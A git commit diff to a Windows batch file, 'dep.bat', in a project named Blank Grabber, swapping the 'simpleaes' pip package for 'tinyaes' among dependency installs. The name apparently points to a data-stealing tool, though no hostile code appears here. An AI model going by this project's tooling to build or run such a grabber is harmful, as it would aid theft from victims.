f47a73d9800c93aed71c0214d98be41aaa7ca57f
Blank <94945186+Blank-c@users.noreply.github.com>
2022-06-10 21:15:03 +0530

    Update dep.bat

--- Blank Grabber/Data/dep.bat
+++ Blank Grabber/Data/dep.bat
@@ -9,7 +9,7 @@ python -m pip install --upgrade pypiwin32
 title Installing dependencies... (4/7)
 python -m pip install --upgrade pillow
 title Installing dependencies... (5/7)
-python -m pip install --upgrade simpleaes
+python -m pip install --upgrade tinyaes
 title Installing dependencies... (6/7)
 cd pyaes
 python setup.py install
